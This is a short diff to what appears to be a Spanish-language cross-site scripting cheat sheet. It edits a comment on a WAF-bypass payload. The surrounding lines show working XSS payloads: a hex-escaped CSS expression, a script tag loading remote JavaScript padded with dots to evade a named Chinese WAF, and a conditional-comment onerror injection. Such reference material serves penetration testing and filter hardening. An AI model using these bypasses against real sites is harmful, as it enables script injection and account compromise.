@@ -340,7 +340,7 @@ xss:\65\78\70\72\65\73\73\69\6f\6e(alert(1))
 #### Bypass específico de WAF
 
 ```html
-.<script src=http://localhost/1.js>.    <!-- Anbao (安全宝): agregar puntos antes y después -->
+.<script src=http://localhost/1.js>.    <!-- Anbao (WAF chino "Anquanbao"): agregar puntos antes y después -->
 <!--[if true]><img onerror=alert(1) src=--> <!-- interferencia con comentarios -->
 ```
 
